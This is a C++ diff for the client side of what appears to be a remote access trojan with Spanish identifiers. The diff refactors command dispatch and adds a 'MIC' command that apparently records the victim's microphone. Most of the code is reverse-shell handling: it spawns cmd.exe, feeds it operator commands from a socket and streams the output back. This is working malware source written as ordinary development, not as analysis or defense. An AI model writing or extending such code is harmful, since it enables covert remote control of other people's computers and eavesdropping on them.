@@ -1,10 +1,13 @@
 #include "cliente.hpp"
+#include "mod_mic.hpp"
 #include "misc.hpp"
+
 
 void Cliente::Init_Key() {
     for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
         this->bKey.push_back(this->t_key[i]);
     }
+
 }
 
 Cliente::Cliente() {
@@ -95,12 +98,14 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         return;
     }
     int iEnviado = 0;
-    if(strIn[0] == "PING"){
+    
+    if(this->Comandos[strIn[0].c_str()] == EnumComandos::PING) {
 #ifdef ___DEBUG_
         std::cout << "Ping\n";
 #endif
-        //implementar un metodo para devolverle el pong con el numero de parametro
-        iEnviado = this->cSend(this->sckSocket, "02\\P", 4, 0, false);
+        std::string strComand = std::to_string(EnumComandos::PONG);
+        strComand.append(1, '\\');
+        iEnviado = this->cSend(this->sckSocket, strComand.c_str(), strComand.size()+1, 0, false);
     }
 
     if (strIn[0] == "CUSTOM_TEST") {
@@ -109,15 +114,27 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         iEnviado = this->cSend(this->sckSocket, strTest.c_str(), strTest.size(), 0, false);
     }
 
+    if (strIn[0] == "MIC") {
+        Mod_Mic* tMic = new Mod_Mic(this);
+        tMic->Grabar_pacman();
+        delete tMic;
+        tMic = nullptr;
+    }
+
     //Iniciar shell
-    if (atoi(strIn[0].c_str()) == EnumComandos::Reverse_Shell_Start) {
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Reverse_Shell_Start) {
+        if (this->reverseSHELL != nullptr) {
+            this->reverseSHELL->TerminarShell();
+            delete this->reverseSHELL;
+            this->reverseSHELL = nullptr;
+        }
         this->reverseSHELL = new ReverseShell(this);
         this->reverseSHELL->sckSocket = this->sckSocket;
         this->reverseSHELL->SpawnShell("C:\\Windows\\System32\\cmd.exe");        
     }
 
     //Escribir comando a la shell
-    if (atoi(strIn[0].c_str()) == EnumComandos::Reverse_Shell_Command) {
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Reverse_Shell_Command) {
         if (this->reverseSHELL) {
             std::string strJoined = "";
             for (int i = 1; i < int(strIn.size()); i++) {
@@ -359,7 +376,9 @@ void ReverseShell::TerminarShell() {
         this->tRead.join();
     }
 
-    this->copy_ptr->cSend(this->sckSocket, "05\\Done... omar :v", 19, 0, false);
+    std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Finish);
+    strComando += "\\Done...";
+    this->copy_ptr->cSend(this->sckSocket, strComando.c_str(), strComando.size()+1, 0, false);
 
     TerminateProcess(this->pi.hProcess, 0);
     if (this->stdinRd != nullptr) {
@@ -401,7 +420,8 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             }
             cBuffer2[dBytesToWrite] = '\0';
 
-            std::string strOut = "06\\";
+            std::string strOut = std::to_string(EnumComandos::Reverse_Shell_Salida);
+            strOut.append(1, '\\');
             strOut += cBuffer2;
 
             int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
